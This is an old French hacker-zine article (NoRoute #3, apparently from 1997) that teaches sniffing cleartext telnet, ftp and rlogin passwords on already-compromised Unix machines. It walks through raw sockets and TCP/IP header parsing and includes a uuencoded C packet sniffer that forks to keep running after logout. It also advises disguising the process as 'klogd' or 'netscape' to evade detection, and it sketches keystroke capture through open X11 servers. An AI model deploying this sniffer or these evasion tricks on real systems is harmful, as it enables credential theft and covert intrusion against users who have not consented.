@@ -1,0 +1,270 @@
+                        ,o$###########################$o,
+                       $' SnIff da nEt rATHEr than C0ke '$
+                        '*oooooooo<[N0Route#3]>oooooooo*'
+						By v0x
+
+*** Introduction
+
+  Hacker une box, c kool, mais bon, une fois que tu es passe root et que
+t'en a tire ce que tu pouvais, generalement elle n'est plus interessante (sauf
+peut-etre pour flooder ou s'en servir comme paserelle pour un autre hack).
+Au lieu de la laisser tomber ca serait plutot sympa si on pouvait voir ce
+qu'il s'y passe et au passage se faire quelques password sans trop de frais :)
+
+  PAS BOUGER! Tonton v0x a pense a ca... Bienvenue dans le monde feerique du
+sniffing, ou : comment hacker dans son fauteuil en laissant faire les autres...
+
+*** Cekoidonk le sniffing ?
+
+  Bon, si t'es un lecteur assidu de NoRoute, tu as surement du lire les
+articles precedents de HotCode et de Kewl sur les sockets et TCP/IP, donc on
+va attaquer directement. Si c'est pas le cas, 1/ on a ton nom ;) 2/ va recup
+les numeros precedents sur le ouaibe de PhE!
+
+  Bien, le but du jeu ca va etre de recuperer le contenu des paquets qui
+voyagent sur le LAN. C'est dingue de voir que la quasi totalite des transmis-
+sions de password se font NON CRYPTEES donc on va exploiter cette faille.
+Le sniffing c'est tout connement le fait de logguer ce qui se passe sur une
+interface reseau.
+
+*** Theorie
+
+  Quand un user se connecte a un telnet ou a un ftp (des fois au rlogin aussi),
+on lui demande invariablement son f*****g password. A moins de l'utilisation
+de kerberos, le password est transmis tel quel via le net sans aucunes forme
+d'encryption aussi primitive soit-elle. Donc grosso-modo, il suffit de logguer
+les paquets dont le port de destination est soit 21 (ftp control connection),
+soit 23 (telnet) soit, au cas ou, 513 (rlogin). Il est aussi necessaire de
+logguer ce qui vient d'un de ces ports de l'exterieur, ca permet de localiser
+rapidement une transmission de password en recherchant les paquets contenant
+par exemple la chaine "Password:" ou "login:"; ensuite ca sera facile de
+filtrer tous les paquets emis par le client et ainsi reconstituer le password
+lettre par lettre...
+
+  Voila pour le concept de base, maintenant, comment recuperer les paquets et
+les decortiquer pour en extraire la substantifique moelle ? =) La technique
+consiste a ouvrir une interface reseau raw sur la machine et les paquets vont
+se faire un plaisir de venir nous dire un ptit coucou... Il y a differents cas
+surtout du point de vue du hardware utilise. Pour illustrer cet article on va
+prendre le cas le plus simple, celui d'une interface IP toute conne, pas
+d'ethernet ou autres, ca serait trop long a detailler dans un article genera-
+liste. Il existe tout un tas de sniffer ethernet, et meme des spoofer ethernet
+comme Mendax ou RBone qui fonctionnent a merveille :). Le code qu'ils utilisent
+pour la prediction du numero de sequence peut etre la base d'un sniffer ETH.
+
+*** Pratique
+
+  La technique est relativement simple a mettre en oeuvre et se resume en deux
+petites lignes :
+
+  int                socket, len, r;
+  char		     buf[512];
+  struct sockaddr_in addr;
+
+  rec = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); /* ourvre une raw socket */
+  r   = recvfrom(rec, buf, 512, 0, (struct sockaddr*)&addr, &len) /* attend un paquet */
+
+  Si rec < 0, c'est que l'ouverture de la socket a echoue, ne pas oublier
+qu'il faut etre root pour pouvoir ouvrir une raw socket! Si r == -1, c'est que
+la reception a echoue... Dans les deux cas, un perror() s'impose :)
+
+  recvfrom() n'attend et ne recupere qu'un seul paquet a la fois! Il faut donc
+boucler afin de recuperer un flux continu.
+
+  Maintenant voyons comment decortiquer les paquets... Apres un recvfrom(),
+le buffer contient un paquet IP qui encapsule un paquet TCP contenant lui meme
+les donnees (pour plus de details, voir l'article de Kewl dans le #1 de NoRoute).
+
+            ,-------------,
+     buf -> | Header   IP | <- ip = (struct iphdr*)buf;
+            |-------------|
+            | Header  TCP | <- tcp = (struct tcphdr*)(buf + ip->ihl<<2);
+            |-------------|
+            | ::::::::::: | <- data = (unsigned char*)(buf +
+            | ::Donnees:: |                            sizeof(struct iphdr) +
+            | ::::::::::: |                            sizeof(struct tcphdr));
+ buf+len -> '-------------'
+
+  Voici le contenu du buffer rempli par recvfrom() et les operations a effectuer
+pour le decouper. Le nombre d'octets de donnees contenu dans le paquet TCP se
+calcule par la formule suivante :
+
+  datalen = len - sizeof(struct iphdr) - sizeof(struct tcphdr) - 1;
+
+  *(data+datalen) represente donc le dernier octet de donnee du paquet TCP et
+egalement la fin 'logique' du buffer (la fin 'physique' etant la limite des
+512 octets - ou plus si on veut etre prevoyant - du buffer temporaire dans la
+pile prevu pour recevoir la stuff. Tiens, ca me fait penser qu'en envoyant un
+paquet de la mort on pourrait faire un buffer overrun et faire executer un egg
+par le programme :))) Sympa, si le r00t a ferme l'acces a la machine because
+[BALISE MODE] ON mais qu'il n'a pas kille le sniffer, on pourrait s'envoyer un
+xterm via le sniffer - MDR :)))... Bon je delire la, faut que j'arrete defini-
+tivement le melon en tranches...).
+
+  Maintenant interessons-nous aux headers qui vont nous permettre de filtrer.
+Voici la declaration de la struct iphdr :
+
+struct iphdr {
+        [plein de stuff inutile]
+        __u32   saddr;            /* ip emmetrice du paquet */
+        __u32   daddr;            /* ip de destination */
+};
+
+  saddr contient l'adresse de l'emeteur du paquet sous la forme d'un entier
+32bits non signe (si A.B.C.D est l'ip, saddr = A*256^3+B*256^2+C*256+D). Il
+est possible de convertir ce nombre en une chaine de caractere comme ca:
+
+  char *ipfrom = inet_ntoa(ip->saddr);
+
+  Les ports etant des entites purement fictives a l'usage unique de TCP, ils
+sont accessibles dans le header TCP parmis d'autres champs...
+Voici la declaration de la struct tcphdr :
+
+struct tcphdr {
+        __u16   source;               /* port source */
+        __u16   dest;                 /* port de reception */
+        __u32   seq;                  /* numero de sequence de l'emeteur */
+        __u32   ack_seq;              /* numero de confirmation de reception */
+
+        __u16   res1:4,
+                doff:4,
+                fin:1,                /* Finish = Fin de transmission */
+                syn:1,                /* Synchronize numbers = demande de connex */
+                rst:1,                /* Reset = fermer connexion, anomalie */
+                psh:1,                /* Push */
+                ack:1,                /* Accuse de reception */
+                urg:1,                /* Urgent ? oui -> urg_ptr */
+                res2:2;
+
+        __u16   window;               /* Fenetre d'acceptation des paquets */
+        __u16   check;                /* Checksum du header+donnees */
+        __u16   urg_ptr;              /* Niveau d'urgence */
+};
+
+  Bon, pour cause de lisibilite, j'ai supprime la structure de compilation
+conditionnelle qui gere l'endian. L'ENDIAN permet de savoir comment sont stockes
+les octets de poids fort et les octets de poids faible dans la memoire. Sur les
+plateformes Intel, c'est LITTLE_INDIAN qui est utlise. De toute facon, peu
+importe le systeme, il faut toujours utiliser ntohs() pour lire le port
+(ntohs() = Network To Host Short) car cette fonction gere automatiquement
+l'indian. Donc :
+
+  unsigned short source_port = ntohs(tcp->th_sport);
+
+  Arme de tout ca, il est possible d'ecrire un sniffer de base mais qui
+remplit sa sombre besogne :)
+
+*** Mise en oeuvre
+
+  J'ai inclus ici un petit sniffer bricole par mes soins qui devrait se
+compiler sur la plupart des Unix. Le voila au format uuencode (une passe de
+uudecode sur tout ce file devrait creer getpkt.c) :
+
+begin 644 getpkt.c
+M+RH@9V5T<&MT+F,@.B!L:71T;&4@<VYI9F9E<@H@*@H@*B!C;VUP:6QE('=I
+M=&@Z"B`J("`@8V,@+6\@9V5T<&MT(&=E='!K="YC"B`J"B`J('5S86=E(#H@
+M9V5T<&MT(%ML;V=N86UE70H@*B!L;V=N86UE(&ES('1H92!F:6QE;F%M92!W
+M:&5R92!T:&4@;F5T=V]R:R!A8W1I=FET>2!W:6QL(&)E(')E<&]R=&5D+`H@
+M*B!I9B!N;VYE(&ES('-U<'!L:65D+"`N+V=E='!K="YL;V<@:7,@87-S=6UE
+M9"X*("H*("H@1&ES8VQA:6UE<B`Z(%1(25,@25,@3TY,62!&3U(@14150T%4
+M24].(%!54E!/4T4L($DG;2!N;W0@:6X@86YY('=A>2!R97-P;VYS:6)L90H@
+M*@D);V8@=&AE("AM:7-S*75S92!T:&%T(&-A;B!B92!M861E(&]F('1H92!I
+M;F9O<FUA=&EO;G,@9VEV96X@8GEE"B`J"0ET:&ES('!R;V=R86TN"B`J"B`J
+M("AC*2`Q.3DW(&)Y('8P>"`M+2!C87-S:6]P0&UY9V%L92YO<F<*("HO"@HC
+M:6YC;'5D92`\<W1D:6\N:#X*(VEN8VQU9&4@/'-Y<R]T>7!E<RYH/@HC:6YC
+M;'5D92`\<WES+W-O8VME="YH/@HC:6YC;'5D92`\;F5T:6YE="]I;E]S>7-T
+M;2YH/@HC:6YC;'5D92`\;F5T:6YE="]I;BYH/@HC:6YC;'5D92`\;F5T+VEF
+M+F@^"B-I;F-L=61E(#QN971I;F5T+VEP+F@^"B-I;F-L=61E(#QN971I;F5T
+M+VEP7W1C<"YH/@HC:6YC;'5D92`\97)R;F\N:#X*(VEN8VQU9&4@/&YE=&1B
+M+F@^"@I&24Q%("IL;V<["@II;FQI;F4@=F]I9"!P<FEN='1C<'!A8VME="AI
+M;G0@<BP@8VAA<B`J8G5F+"!S=')U8W0@<V]C:V%D9')?:6X@*F%D9'(I"GL*
+M("!S=')U8W0@:7!H9'(@*FEP.PH@('-T<G5C="!T8W!H9'(@*G1C<#L*("!I
+M;G0)(&-N="P@;&5N(#T@+3$["@H@(&%D9'(M/G-I;E]A9&1R+G-?861D<B`]
+M(&YT;VAL*&%D9'(M/G-I;E]A9&1R+G-?861D<BD["B`@:7`)"0D]("AS=')U
+M8W0@:7!H9'(@*BEB=68["B`@;&5N"0D)/2!I<"T^:6AL(#P\(#(["B`@=&-P
+M(#T@*'-T<G5C="!T8W!H9'(@*BDH8G5F("L@;&5N*3L*"B`@9G!R:6YT9BAL
+M;V<L("(M+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TB
+M(%P*"2`@("`@("`B+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TM+2TM
+M+2TM+2TM+5QN(BD["B`@9G!R:6YT9BAL;V<L(")&<F]M("5S.B5H=2!T;R`E
+M<SHE:'4B+"!I;F5T7VYT;V$H:7`M/G-A9&1R*2P@;G1O:',H=&-P+3YT:%]S
+M<&]R="DL"@D)"0D):6YE=%]N=&]A*&EP+3YD861D<BDL(&YT;VAS*'1C<"T^
+M=&A?9'!O<G0I*3L*("!F<')I;G1F*&QO9RP@(B`M+2!397%.=6T@/2`E;'4L
+M($%C:TYU;2`]("5L=5QN(BP*"2`@("`@("!N=&]H;"AT8W`M/G1H7W-E<2DL
+M(&YT;VAL*'1C<"T^=&A?86-K*2D["B`@9G!R:6YT9BAL;V<L(")&;&%G<R`Z
+M(BD["B`@:68@*"%T8W`M/G1H7V9L86=S*0H@("`@<')I;G1F*"(@;F]N92(I
+M.PH@(&5L<V4@>PH@("`@:68@*'1C<"T^=&A?9FQA9W,@)B!42%]&24XI"B`@
+M("`@(&9P<FEN=&8H;&]G+"`B($9)3B(I.PH@("`@:68@*'1C<"T^=&A?9FQA
+M9W,@)B!42%]364XI"B`@("`@(&9P<FEN=&8H;&]G+"`B(%-93B(I.PH@("`@
+M:68@*'1C<"T^=&A?9FQA9W,@)B!42%]24U0I"B`@("`@(&9P<FEN=&8H;&]G
+M+"`B(%)35"(I.PH@("`@:68@*'1C<"T^=&A?9FQA9W,@)B!42%]055-(*0H@
+M("`@("!F<')I;G1F*&QO9RP@(B!055-((BD["B`@("!I9B`H=&-P+3YT:%]F
+M;&%G<R`F(%1(7T%#2RD*("`@("`@9G!R:6YT9BAL;V<L("(@04-+(BD["B`@
+M("!I9B`H=&-P+3YT:%]F;&%G<R`F(%1(7U521RD*("`@("`@9G!R:6YT9BAL
+M;V<L("(@55)'(BD["B`@?0H@(&9P<FEN=&8H;&]G+"`B("T@=VEN9&]W("5D
+M7&XB+"!N=&]H<RAT8W`M/G1H7W=I;BDI.PH@(&EF("AR(#X@*'-I>F5O9BAS
+M=')U8W0@:7!H9'(I*W-I>F5O9BAS=')U8W0@=&-P:&1R*2DI('L*("`@(&9P
+M<FEN=&8H;&]G+"`B1&%T82!F;VQL;W<@*"5I(&)Y=&5S*3I<;B(L"@D)('(M
+M<VEZ96]F*'-T<G5C="!I<&AD<BDM<VEZ96]F*'-T<G5C="!T8W!H9'(I*3L*
+M("`@(&9O<BAC;G0],#L@8VYT(#P@<BUS:7IE;V8H<W1R=6-T(&EP:&1R*2US
+M:7IE;V8H<W1R=6-T('1C<&AD<BD[(&-N="LK*0H@("`@("!F<')I;G1F*&QO
+M9RP@(B5C(BP*"0D@("`J*"AC:&%R*BDH8G5F*W-I>F5O9BAS=')U8W0@:7!H
+M9'(I*W-I>F5O9BAS=')U8W0@=&-P:&1R*2MC;G0I*2D["B`@("!F<')I;G1F
+M*&QO9RP@(EQN(BD["B`@("!F;W(H8VYT/3`[(&-N="`\('(M<VEZ96]F*'-T
+M<G5C="!I<&AD<BDM<VEZ96]F*'-T<G5C="!T8W!H9'(I.R!C;G0K*RD*("`@
+M("`@9G!R:6YT9BAL;V<L("(P>"5X("(L"@D)("`@*B@H=6YS:6=N960@8VAA
+M<BHI*&)U9BMS:7IE;V8H<W1R=6-T(&EP:&1R*2MS:7IE;V8H<W1R=6-T('1C
+M<&AD<BDK8VYT*2DI.PH@("`@9G!R:6YT9BAL;V<L(")<;B(I.PH@('T*?0H@
+M"G9O:60@9V5T=&-P<&%C:V5T*&EN="!S+"!C:&%R("IB=68L(&EN="!S:7IE
+M*0I["B`@<W1R=6-T('-O8VMA9&1R7VEN(&%D9'(["B`@<W1R=6-T(&EP:&1R
+M"2`@("`@*FEP.PH@('-T<G5C="!T8W!H9'()("`@("`J=&-P.PH@(&EN=`D)
+M("`@("!L96XL('(["@H@(&QE;B`]('-I>F5O9BAA9&1R*3L*("!I9B`H*'(@
+M/2!R96-V9G)O;2AS+"!B=68L('-I>F4L(#`L("AS=')U8W0@<V]C:V%D9'(@
+M*BDF861D<BP@)FQE;BDI(#T]("TQ*2!["B`@("!P97)R;W(H(G)E8W9F<F]M
+M(BD["B`@("!F<')I;G1F*'-T9&5R<BPB97)R;W(Z(')E8W9F<F]M(')E='5R
+M;F5D("5D7&XB+'(I.PH@("`@97AI="@Q*3L*("!]"@H@('!R:6YT=&-P<&%C
+M:V5T*'(L(&)U9BP@)F%D9'(I.PI]"@IV;VED(&UA:6XH:6YT(&%R9V,L(&-H
+M87(@*F%R9W9;72D*>PH@(&EN=`D)<F5C+"!S96XL(')E="P@:3TQ.PH@('5N
+M<VEG;F5D(&-H87(@8G5F6S0P.39=.PH@(&-H87()"6QO9V9I;&5;,C!=.PH*
+M("!I9B`H87)G8R`\(#(I"B`@("!S=')C<'DH;&]G9FEL92P@(BXO9V5T<&MT
+M+FQO9R(I.PH@(&5L<V4*("`@('-T<F-P>2AL;V=F:6QE+"!A<F=V6S%=*3L*
+M"B`@:68@*"AR96,@/2!S;V-K970H049?24Y%5"P@4T]#2U]205<L($E04%)/
+M5$]?5$-0*2D@/"`P*2!["B`@("!P97)R;W(H(F5R<F]R.B!R96-V('-O8VME
+M="(I.PH@("`@97AI="@Q*3L*("!]"@H@(')E="`](&9O<FLH*3L*("`*("!I
+M9B`H<F5T(#T](#`I('L*("`@(&EF("@A*&QO9R`](&9O<&5N*&QO9V9I;&4L
+M(")W*R(I*2D@>PH@("`@("!P97)R;W(H(F5R<F]R.B!C86XG="!C<F5A=&4@
+M;&]G(&9I;&4B*3L*("`@("`@97AI="@Q*3L*("`@('T*("`@('=H:6QE("@Q
+L*0H@("`@("!G971T8W!P86-K970H<F5C+"!B=68L(#0P.38I.PH@('T*?0HQ
+`
+end
+
+
+  Faut noter que ce sniffer fork() pour qu'il continue de fonctionner quand
+l'user est deloggue... Donc c'est pas con de renommer l'executable en
+"netscape" ou "klogd" ou un truc qui attire pas trop l'attention lors d'un
+'ps', surtout qu'on peut ne pas lui donner un nom de fichier dans lequel
+logguer de facon a ce que ca ne se voit pas :)
+
+*** Conclusion
+
+  Voila pour les base du sniffing TCP/IP. Tiens, je viens juste d'y repenser,
+il existe un autre type de sniffing tres interessant, le sniffing d'evennements.
+Sous X, lorsqu'une touche est pressee ou que la souris est deplacee ou qu'un
+de ses bouttons a ete presse, le serveur X genere un evennement. En plus comme
+X est aussi un protocole reseau (les applications peuvent utiliser TCP/IP (port
+6000) pour dialoguer avec le serveur X plutot que la memoire partagee si celle-
+ci n'est pas supportee ou qu'on est sur un terminal X. Pour peu que l'host
+d'ou on veut logguer soit dans le xhost du serveur a surveiller, c'est un jeu
+d'enfant (meme pas besoin d'etre root nul part). En plus, pas mal de config
+ont par defaut un 'xhost -'. Il existe meme un programme permettant de se
+reconnecter a un serveur X avec un 'xhost -' mais ou une application locale est
+toujours connectee =)
+
+  Donc pour conclure rapidos, avec ce dernier exemple on comprends que le
+sniffing sous toutes ses formes peut etre vraiment tres utile pour le mec qui
+veut recup des account sans trop se faire chier...
+
+---
+a+, v0x (cassiop@mygale.org)
+
+Greetz fly to : kewl, CoD4, ceux de PhE! (notemment HotCode), ceux (qui restent
+:((( ) de F-KAOS...
